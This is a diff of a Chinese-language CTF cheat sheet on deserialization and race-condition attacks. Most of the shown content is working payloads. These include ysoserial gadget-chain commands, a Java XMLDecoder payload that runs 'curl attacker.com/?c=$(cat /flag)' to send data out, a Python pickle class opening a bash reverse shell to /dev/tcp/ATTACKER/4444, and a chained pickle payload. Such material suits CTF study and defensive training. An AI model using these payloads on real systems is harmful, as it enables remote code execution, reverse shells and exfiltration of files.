@@ -20,7 +20,7 @@
 - 构造 POP 链利用
 - 尝试 phar:// 协议触发
 
-## 攻击技术
+## PHP 反序列化
 
 ### SPL Autoload 文件包含链
 
@@ -76,13 +76,9 @@ phar://path/to/phar.phar
 - `+` 号绕过 (URL编码为 `%2B`)
 - 大写/小写类名
 
----
+## Java 反序列化
 
-## 来自外部导入内容 (CTF Web - server-side-deser.md)
-
-### Java 反序列化 (ysoserial)
-
-**检测:**
+### 检测
 - Base64 解码可疑 blob — Java 序列化数据以 magic bytes `AC ED 00 05` 开头
 - 搜索 `ObjectInputStream`, `readObject`, `readUnshared`
 - Content-Type `application/x-java-serialized-object`
@@ -103,13 +99,27 @@ java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser
 java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
 ```
 
-**绕过过滤器:**
+### 绕过过滤器
 - 如果 `ObjectInputStream` 子类阻止特定类，尝试其他链
 - JNDI 注入: `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI 服务器
 
-### Python Pickle 反序列化
+### Java XMLDecoder 反序列化 RCE
 
-**检测:**
+```xml
+<object class="java.lang.Runtime" method="getRuntime">
+  <void method="exec">
+    <array class="java.lang.String" length="3">
+      <void index="0"><string>/bin/sh</string></void>
+      <void index="1"><string>-c</string></void>
+      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
+    </array>
+  </void>
+</object>
+```
+
+## Python Pickle 反序列化
+
+### 检测
 - Base64 blob 包含 `\x80\x04\x95` (pickle protocol 4) 或 `\x80\x05\x95` (protocol 5)
 - Flask session 使用 `pickle` 序列化器 (vs 默认 `json`)
 
@@ -129,11 +139,28 @@ class RevShell:
         return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
 ```
 
-**绕过受限 unpickler:**
+### 绕过受限 unpickler
 - 如果 `builtins` 允许: `(__builtins__.__import__, ('os',))` 然后链式调用 `.system()`
 - YAML 反序列化 (`yaml.load()` 没有 `Loader=SafeLoader`) 通过 `!!python/object/apply:os.system` 有类似的 RCE
 
-### 竞态条件 (TOCTOU)
+### Pickle 链通过 STOP Opcode 剥离
+
+```python
+import pickle, os
+
+class Redirect:
+    def __reduce__(self):
+        return (os.dup2, (5, 1))  # 重定向 stdout 到 socket fd 5
+
+class Execute:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+# 从第一个 payload 剥离 STOP opcode，连接第二个
+payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
+```
+
+## 竞态条件 (TOCTOU)
 
 **模式:** 服务器检查条件（余额、注册唯一性、优惠券有效性），然后在单独步骤中执行操作。检查和操作之间的并发请求绕过验证。
 
@@ -159,38 +186,7 @@ asyncio.run(race('http://target/api/transfer',
 - **注册唯一性:** `if not user_exists(name)` → 同时注册相同用户名
 - **文件上传+使用:** 在上传和验证之间访问文件
 
-### Pickle 链通过 STOP Opcode 剥离 (VolgaCTF 2013)
-
-```python
-import pickle, os
-
-class Redirect:
-    def __reduce__(self):
-        return (os.dup2, (5, 1))  # 重定向 stdout 到 socket fd 5
-
-class Execute:
-    def __reduce__(self):
-        return (os.system, ('cat /flag.txt',))
-
-# 从第一个 payload 剥离 STOP opcode，连接第二个
-payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
-```
-
-### Java XMLDecoder 反序列化 RCE (HackIM 2016)
-
-```xml
-<object class="java.lang.Runtime" method="getRuntime">
-  <void method="exec">
-    <array class="java.lang.String" length="3">
-      <void index="0"><string>/bin/sh</string></void>
-      <void index="1"><string>-c</string></void>
-      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
-    </array>
-  </void>
-</object>
-```
-
-### PHP 序列化长度操作通过过滤器词扩展 (0CTF 2016)
+## PHP 序列化长度操作通过过滤器词扩展
 
 ```php
 // 注入的有效载荷:
